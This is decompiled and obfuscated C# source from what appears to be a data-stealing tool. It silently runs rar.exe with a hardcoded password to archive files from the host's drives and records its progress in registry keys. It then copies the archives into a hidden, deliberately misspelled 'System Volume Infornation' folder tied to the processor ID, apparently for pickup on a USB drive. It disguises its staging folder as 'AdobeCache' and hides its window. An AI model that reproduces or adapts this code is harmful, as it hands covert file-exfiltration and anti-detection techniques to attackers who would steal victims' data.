						DateTime dateTime_6 = Delegate244.smethod_0(ref dateTime_4, -1.0);
						int_6 = 1;
						string text4;
						string text5;
						string text6;
						ProcessStartInfo processStartInfo;
						Process object_7;
						if (Delegate210.smethod_0(registryKey_0, "FristCollect") == null)
						{
							text4 = Delegate298.smethod_0(Delegate122.smethod_0(Delegate321.smethod_0(object_4, k), char_), 1, 1);
							text5 = Delegate317.smethod_0(Delegate321.smethod_0(object_, j), Delegate278.smethod_0(Delegate321.smethod_0(object_, j)) - 2);
							text6 = Delegate231.smethod_0(new string[9]
							{
								" a -r -pys123* -v10000k \"",
								string_4,
								"\\",
								text5,
								text4,
								".tmp\" \"",
								Delegate321.smethod_0(object_, j),
								Delegate321.smethod_0(object_4, k),
								"\""
							});
							processStartInfo = Delegate176.smethod_0(Delegate271.smethod_0(string_2, "\\rar.exe"), text6);
							Delegate297.smethod_0(processStartInfo, Delegate271.smethod_0(string_2, "\\"));
							Delegate76.smethod_0(processStartInfo, ProcessWindowStyle.Hidden);
							object_7 = Delegate142.smethod_0();
							Delegate284.smethod_0(object_7, processStartInfo);
							Delegate156.smethod_0(object_7);
							Delegate323.smethod_0(30000);
							if (k < Delegate256.smethod_0(object_4) - 1)
							{
								Delegate90.smethod_0(registryKey_0, "IJ", Delegate135.smethod_0("{0},{1}", j, k + 1));
							}
							else
							{
								Delegate90.smethod_0(registryKey_0, "IJ", Delegate135.smethod_0("{0},{1}", j + 1, 0));
							}
							continue;
						}
						text4 = Delegate298.smethod_0(Delegate122.smethod_0(Delegate321.smethod_0(object_4, k), char_), 1, 1);
						text5 = Delegate317.smethod_0(Delegate321.smethod_0(object_, j), Delegate278.smethod_0(Delegate321.smethod_0(object_, j)) - 2);
						text6 = Delegate231.smethod_0(new string[13]
						{
							" a -r -ta",
							Delegate132.smethod_0(ref dateTime_6, "yyyyMMdd"),
							" -tb",
							Delegate132.smethod_0(ref dateTime_5, "yyyyMMdd"),
							" -pys123* -v10000k \"",
							string_4,
							"\\",
							text5,
							text4,
							".tmp\" \"",
							Delegate321.smethod_0(object_, j),
							Delegate321.smethod_0(object_4, k),
							"\""
						});
						processStartInfo = Delegate176.smethod_0(Delegate271.smethod_0(string_2, "\\rar.exe"), text6);
						Delegate297.smethod_0(processStartInfo, Delegate271.smethod_0(string_2, "\\"));
						Delegate76.smethod_0(processStartInfo, ProcessWindowStyle.Hidden);
						object_7 = Delegate142.smethod_0();
						Delegate284.smethod_0(object_7, processStartInfo);
						Delegate156.smethod_0(object_7);
						Delegate323.smethod_0(30000);
						if (k < Delegate256.smethod_0(object_4) - 1)
						{
							Delegate90.smethod_0(registryKey_0, "IJ", Delegate135.smethod_0("{0},{1}", j, k + 1));
						}
						else
						{
							Delegate90.smethod_0(registryKey_0, "IJ", Delegate135.smethod_0("{0},{1}", j + 1, 0));
						}
					}
				}
				if (Delegate210.smethod_0(registryKey_0, "IJ") != null)
				{
					Delegate250.smethod_0(registryKey_0, "IJ");
				}
				if (Delegate210.smethod_0(registryKey_0, "FristCollect") == null)
				{
					Delegate90.smethod_0(registryKey_0, "FristCollect", "1");
				}
				if (Delegate210.smethod_0(registryKey_0, "DateInternet") != null)
				{
					Delegate250.smethod_0(registryKey_0, "DateInternet");
				}
				Delegate90.smethod_0(registryKey_0, "DateInternet", Delegate268.smethod_0());
				int_6 = 0;
			}
		}
		Delegate15.smethod_0(this);
	}

	private static string smethod_2()
	{
		if (8 == Delegate199.smethod_0() || !Delegate64.smethod_0(Delegate185.smethod_0("PROCESSOR_ARCHITEW6432")))
		{
			return Delegate185.smethod_0("ProgramFiles(x86)");
		}
		return Delegate185.smethod_0("ProgramFiles");
	}

	public void MoveFileMeothd()
	{
		//IL_02c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		try
		{
			Delegate323.smethod_0(45000);
			if (int_6 == 0)
			{
				try
				{
					USBSerialNumber object_ = Delegate201.smethod_0();
					string text = Delegate317.smethod_0(Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1), Delegate278.smethod_0(Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1)) - 1);
					string text2 = Delegate187.smethod_0(object_, text);
					if (text2 != null || text2 != null)
					{
						DriveInfo object_2 = Delegate96.smethod_0(text);
						DriveInfo[] array = Delegate263.smethod_0();
						List<string> object_3 = Delegate75.smethod_0();
						List<string> object_4 = Delegate75.smethod_0();
						string object_5 = Delegate271.smethod_0(Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData), "\\AdobeCache");
						int num = Delegate278.smethod_0(object_5);
						string text3 = Delegate232.smethod_0(object_5, 3, num - 3);
						DriveInfo[] array2 = array;
						foreach (DriveInfo object_6 in array2)
						{
							if (Delegate35.smethod_0(object_6) != DriveType.CDRom && Delegate35.smethod_0(object_6) == DriveType.Fixed)
							{
								string text4 = Delegate317.smethod_0(Delegate255.smethod_0(object_6), Delegate278.smethod_0(Delegate255.smethod_0(object_6)) - 2);
								USBSerialNumber object_7 = Delegate201.smethod_0();
								string text5 = Delegate187.smethod_0(object_7, text4);
								if (text5 == null)
								{
									Delegate94.smethod_0(object_3, Delegate255.smethod_0(object_6));
								}
							}
						}
						if (Delegate256.smethod_0(object_3) > 0)
						{
							for (int j = 0; j < Delegate256.smethod_0(object_3); j++)
							{
								if (Delegate8.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_3, j), "System Volume Infornation")))
								{
									string[] ienumerable_ = Delegate144.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_3, j), "System Volume Infornation"));
									Delegate131.smethod_0(object_4, ienumerable_);
								}
								else if (Delegate8.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_3, j), text3)))
								{
									string[] ienumerable_ = Delegate144.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_3, j), text3));
									Delegate131.smethod_0(object_4, ienumerable_);
								}
							}
							Delegate11.smethod_0(object_4);
							for (int j = Delegate256.smethod_0(object_4) - 1; j >= 0; j--)
							{
								Delegate275.smethod_0(timer_0);
								Delegate275.smethod_0(timer_1);
								double double_ = Delegate29.smethod_0(Delegate55.smethod_0(object_2)) / Delegate29.smethod_0(Delegate350.smethod_0(object_2)) * 100.0;
								double num2 = Delegate109.smethod_0(double_, 2);
								if (num2 <= 30.0)
								{
									break;
								}
								string text6 = Delegate271.smethod_0(text, ":\\System Volume Infornation");
								if (Delegate8.smethod_0(text6))
								{
									DirectoryInfo object_8 = Delegate148.smethod_0(text6);
									Delegate182.smethod_0(object_8, FileAttributes.Hidden);
								}
								else
								{
									DirectoryInfo object_8 = Delegate141.smethod_0(text6);
									Delegate182.smethod_0(object_8, FileAttributes.Hidden);
								}
								string text7 = string.Empty;
								ManagementClass object_9 = Delegate348.smethod_0("win32_processor");
								ManagementObjectCollection object_10 = Delegate27.smethod_0(object_9);
								ManagementObjectEnumerator val = Delegate16.smethod_0(object_10);
								try
								{
									if (Delegate204.smethod_0(val))
									{
										ManagementObject object_11 = (ManagementObject)Delegate149.smethod_0(val);
										text7 = Delegate337.smethod_0(Delegate242.smethod_0(Delegate308.smethod_0(Delegate107.smethod_0(object_11), "processorID")));
									}
								}
								finally
								{
									if (val != null)
									{
										Delegate69.smethod_0(val);
									}
								}
								string text8 = Delegate295.smethod_0(text6, "\\", text7);
								if (Delegate8.smethod_0(text8))
								{
									text6 = text8;
								}
								else
								{
									DirectoryInfo object_8 = Delegate141.smethod_0(text8);
									text6 = text8;
								}
								string[] ienumerable_ = Delegate144.smethod_0(text6);
								string text9 = Delegate146.smethod_0(Delegate321.smethod_0(object_4, j));
								for (int k = 0; k < ienumerable_.Length - 1; k++)
								{
									if (Delegate83.smethod_0(ienumerable_[k], text9))
									{
										bool_2 = true;
										break;
									}
								}
								if (!bool_2)
								{
									Delegate213.smethod_0(this, Delegate321.smethod_0(object_4, j));
									smethod_1(Delegate321.smethod_0(object_4, j), Delegate295.smethod_0(text6, "\\", Delegate146.smethod_0(Delegate321.smethod_0(object_4, j))), bool_3: true);
								}
								Delegate158.smethod_0(this, new repaintDelegate(timer_0.Start));
								Delegate158.smethod_0(this, new repaintDelegate(timer_1.Start));
							}
						}
					}
				}
				catch
				{
				}
			}
			Delegate332.smethod_0(this);
		}
		catch
		{
		}
	}

	public void Rename(string Rename)
	{
		string[] array = Delegate319.smethod_0(Rename, "*.rar", SearchOption.AllDirectories);
		for (int i = 0; i < array.Length; i++)
		{
			string[] array2 = Delegate177.smethod_0(array[i], new char[1] { '.' });
			string text = Delegate14.smethod_0(array2[0], array2[2], ".", array2[1]);
			FileInfo object_ = Delegate329.smethod_0(array[i]);
			Delegate61.smethod_0(object_, text);
			Delegate196.smethod_0(object_);
		}
	}

	private void method_6(object sender, FormClosedEventArgs e)
	{
		Delegate280.smethod_0(Delegate304.smethod_0());
	}

	private void method_7(object sender, FormClosingEventArgs e)
	{
		Delegate280.smethod_0(Delegate304.smethod_0());
	}

	private void method_8(object sender, EventArgs e)
	{
		thread_2 = Delegate254.smethod_0(MoveFileMeothd);
		Delegate93.smethod_0(thread_2);
		Delegate275.smethod_0(timer_4);
	}

	public string[] GetFile(string PathGetFile, string FileExp)
	{
		List<string> ienumerable_ = Delegate75.smethod_0();
		List<string> object_ = Delegate75.smethod_0();
		string[] array = Delegate144.smethod_0(PathGetFile);
		string[] ienumerable_2 = Delegate172.smethod_0(PathGetFile);
		for (int i = 0; i < array.Length; i++)
		{
			try
			{
				ienumerable_ = Delegate75.smethod_0();
				string[] ienumerable_3 = Delegate319.smethod_0(array[i], FileExp, SearchOption.AllDirectories);
				ienumerable_ = Delegate293.smethod_0(ienumerable_3);
			}
			catch
			{
			}
			Delegate131.smethod_0(object_, ienumerable_);
		}
		Delegate131.smethod_0(object_, ienumerable_2);
		return Delegate267.smethod_0(object_);
	}

	public string ConvertIConToHex(string HexString)
	{
		byte[] byte_ = Delegate227.smethod_0(Delegate118.smethod_0(), HexString);
		return Delegate202.smethod_0(Delegate335.smethod_0(byte_), "-", string.Empty);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			Delegate69.smethod_0(icontainer_0);
		}
		Delegate240.smethod_0(this, disposing);
	}

	private void method_9()
	{
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Expected O, but got Unknown
		//IL_0389: Unknown result type (might be due to invalid IL or missing references)
		//IL_0393: Expected O, but got Unknown
		icontainer_0 = Delegate168.smethod_0();
		timer_0 = Delegate315.smethod_0(icontainer_0);
		label_0 = Delegate289.smethod_0();
		label_1 = Delegate289.smethod_0();
		label_2 = Delegate289.smethod_0();
		richTextBox_0 = Delegate276.smethod_0();
		timer_1 = Delegate315.smethod_0(icontainer_0);
		timer_2 = Delegate315.smethod_0(icontainer_0);
		timer_3 = Delegate315.smethod_0(icontainer_0);
		timer_4 = Delegate315.smethod_0(icontainer_0);
		Delegate127.smethod_0(this);
		Delegate60.smethod_0(timer_0, method_1);
		Delegate7.smethod_0(label_0, bool_0: true);
		Delegate140.smethod_0(label_0, new Point(4, 26));
		Delegate92.smethod_1(label_0, "label1");
		Delegate209.smethod_0(label_0, new Size(37, 13));
		Delegate154.smethod_0(label_0, 0);
		Delegate46.smethod_0(label_0, "Found");
		Delegate7.smethod_0(label_1, bool_0: true);
		Delegate140.smethod_0(label_1, new Point(7, 58));
		Delegate92.smethod_1(label_1, "lblSerial");
		Delegate209.smethod_0(label_1, new Size(33, 13));
		Delegate154.smethod_0(label_1, 1);
		Delegate46.smethod_0(label_1, "Serial");
		Delegate7.smethod_0(label_2, bool_0: true);
		Delegate140.smethod_0(label_2, new Point(7, 89));
		Delegate92.smethod_1(label_2, "lblRemoved");
		Delegate209.smethod_0(label_2, new Size(48, 13));
		Delegate154.smethod_0(label_2, 2);
		Delegate46.smethod_0(label_2, "removed");
		Delegate140.smethod_0(richTextBox_0, new Point(12, 122));
		Delegate92.smethod_1(richTextBox_0, "richTextBox1");
		Delegate209.smethod_0(richTextBox_0, new Size(267, 127));
		Delegate154.smethod_0(richTextBox_0, 3);
		Delegate46.smethod_0(richTextBox_0, "");
		Delegate328.smethod_0(timer_1, bool_0: true);
		Delegate195.smethod_0(timer_1, 60000);
		Delegate60.smethod_0(timer_1, method_2);
		Delegate328.smethod_0(timer_2, bool_0: true);
		Delegate195.smethod_0(timer_2, 45000);
		Delegate60.smethod_0(timer_2, method_4);
		Delegate195.smethod_0(timer_3, 60000);
		Delegate60.smethod_0(timer_3, method_5);
		Delegate328.smethod_0(timer_4, bool_0: true);
		Delegate195.smethod_0(timer_4, 10000);
		Delegate60.smethod_0(timer_4, method_8);
		Delegate181.smethod_0(this, new SizeF(6f, 13f));
		Delegate74.smethod_0(this, (AutoScaleMode)1);
		Delegate262.smethod_0(this, new Size(284, 261));
		Delegate253.smethod_0(Delegate34.smethod_0(this), (Control)(object)richTextBox_0);
		Delegate253.smethod_0(Delegate34.smethod_0(this), (Control)(object)label_2);
		Delegate253.smethod_0(Delegate34.smethod_0(this), (Control)(object)label_1);
		Delegate253.smethod_0(Delegate34.smethod_0(this), (Control)(object)label_0);
		Delegate92.smethod_0(this, "Form1");
		Delegate46.smethod_0(this, "Form1");
		Delegate56.smethod_0(this, (FormWindowState)1);
		Delegate51.smethod_0(this, new FormClosingEventHandler(method_7));
		Delegate346.smethod_0(this, new FormClosedEventHandler(method_6));
		Delegate25.smethod_0(this, method_0);
		Delegate105.smethod_0(this, bool_0: false);
		Delegate306.smethod_0(this);
	}

	[CompilerGenerated]
	private static int smethod_3(Class1 class1_0, Class1 class1_1)
	{
		DateTime dateTime_ = class1_0.DateTime_0;
		return Delegate223.smethod_0(ref dateTime_, class1_1.DateTime_0);
	}

	[CompilerGenerated]
	private static int smethod_4(Class1 class1_0, Class1 class1_1)
	{
		DateTime dateTime_ = class1_0.DateTime_0;
		return Delegate223.smethod_0(ref dateTime_, class1_1.DateTime_0);
	}
}
